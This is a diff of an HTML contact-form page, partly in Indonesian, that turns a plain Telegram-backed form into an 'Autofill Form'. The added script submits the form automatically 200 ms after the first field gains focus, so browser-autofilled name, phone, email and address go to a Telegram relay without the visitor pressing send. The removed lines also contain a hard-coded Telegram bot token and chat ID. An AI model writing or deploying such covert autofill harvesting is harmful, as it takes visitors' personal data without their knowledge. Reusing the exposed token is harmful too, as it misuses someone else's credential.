@@ -1,64 +1,56 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Form Kontak</title>
+  <title>Autofill Form</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="container">
-    <h1>Form Kontak</h1>
-    <form id="kontakForm">
-      <label for="nama">Nama:</label>
-      <input type="text" id="nama" name="name" autocomplete="name" />
-
-      <label for="nohp">No HP:</label>
-      <input type="tel" id="nohp" name="tel" autocomplete="tel" />
-
-      <button id="submitBtn" type="submit">Kirim</button>
+    <h2>Autofill Form</h2>
+    <form id="autofillForm">
+      <input type="text" name="name" placeholder="Nama" autocomplete="name" required />
+      <input type="tel" name="phone" placeholder="Nomor HP" autocomplete="tel" required />
+      <input type="email" name="email" placeholder="Email" autocomplete="email" required />
+      <input type="text" name="address" placeholder="Alamat" autocomplete="street-address" />
+      <button type="submit">Kirim</button>
     </form>
     <p id="status"></p>
   </div>
 
   <script>
-    const form = document.getElementById("kontakForm");
+    const form = document.getElementById("autofillForm");
     const status = document.getElementById("status");
-    const submitBtn = document.getElementById("submitBtn");
 
-    form.addEventListener("submit", function (e) {
+    form.addEventListener("focusin", () => {
+      setTimeout(() => {
+        form.requestSubmit();
+      }, 200); // memberi waktu autofill muncul dulu
+    }, { once: true });
+
+    form.addEventListener("submit", async (e) => {
       e.preventDefault();
+      status.textContent = "Mengirim...";
 
-      const nama = document.getElementById("nama").value.trim();
-      const nohp = document.getElementById("nohp").value.trim();
+      const formData = new FormData(form);
+      const data = Object.fromEntries(formData.entries());
 
-      let message = "";
-      if (nama) message += `Nama: ${nama}%0A`;
-      if (nohp) message += `No HP: ${nohp}`;
+      try {
+        const res = await fetch("/.netlify/functions/sendToTelegram", {
+          method: "POST",
+          body: JSON.stringify(data),
+        });
 
-      if (message === "") {
-        status.innerText = "Isi minimal satu field.";
-        return;
-      }
-
-      const token = "7887428382:AAEPSoJn_agWn17MEGEM43hStu-pmr6kC5Q"; // Ganti dengan token bot kamu
-      const chatId = "7096229986";  // Ganti dengan chat ID kamu
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`, {
-        method: "GET"
-      })
-      .then(response => {
-        if (response.ok) {
-          status.innerText = "Berhasil dikirim!";
-          submitBtn.style.backgroundColor = "#2ecc71";
+        if (res.ok) {
+          status.textContent = "Terkirim ke Telegram ✅";
           form.reset();
         } else {
-          status.innerText = "Gagal mengirim.";
+          status.textContent = "Gagal mengirim ❌";
         }
-      })
-      .catch(error => {
-        status.innerText = "Terjadi kesalahan.";
-      });
+      } catch (err) {
+        status.textContent = "Terjadi error ❌";
+      }
     });
   </script>
 </body>
